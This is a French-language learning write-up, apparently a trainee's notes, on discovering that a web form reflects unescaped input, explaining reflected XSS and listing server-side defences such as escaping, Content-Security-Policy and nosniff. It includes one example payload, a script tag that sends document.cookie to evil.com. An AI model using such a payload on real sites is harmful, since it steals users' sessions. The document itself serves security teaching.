# 📌 Analyse approfondie – Mission 2.2
## "Pourquoi l’injection de données dans un formulaire est un vrai risque de sécurité"

---

## 🧠 Ce que j’ai découvert techniquement

En manipulant un formulaire web simple, j’ai pu :
- Modifier les valeurs envoyées dans les champs (nom, téléphone)
- Injecter du code potentiellement malveillant (HTML / JS / SQL)
- Observer que ces données étaient **renvoyées telles quelles dans la réponse**
- Constater l’absence de filtrage ou d’échappement des caractères spéciaux

➡️ Cela signifie que **le serveur ne protège pas la sortie des données entrées par l’utilisateur**.

---

## ⚠️ Pourquoi c’est dangereux

### 1. ❗ Risque de XSS réfléchi (Reflected Cross-Site Scripting)

Si un site **renvoie directement** ce qu’un utilisateur tape dans une page HTML sans vérification, un attaquant peut injecter :
```html
<script>document.location='https://evil.com?cookie='+document.cookie</script>

➡️ Cela peut permettre :

Le vol de session utilisateur

L’injection de fausses interfaces (phishing)

L’exécution de scripts malveillants


 Pourquoi c’est un échec de sécurité côté serveur
Un serveur bien configuré devrait :

✅ Filtrer ou échapper tous les caractères spéciaux HTML (<, >, ', ", etc.)

✅ Appliquer la politique Content-Security-Policy dans les headers

✅ Ajouter X-Content-Type-Options: nosniff pour empêcher l’exécution non voulue

✅ Ne jamais renvoyer tel quel une donnée entrée par l’utilisateur dans une page HTML sans traitement

👀 Ce que j’ai appris
Observer un formulaire n’est pas juste lire du HTML : c’est observer les mécanismes cachés derrière l’interface

Toute donnée contrôlée par l’utilisateur est une porte potentielle

La faiblesse ne vient pas toujours du formulaire → elle vient de ce que le serveur en fait

Ce genre de faille est courant en entreprise, surtout dans :

Des formulaires oubliés

Des outils internes

Des pages d’admin légères mal protégées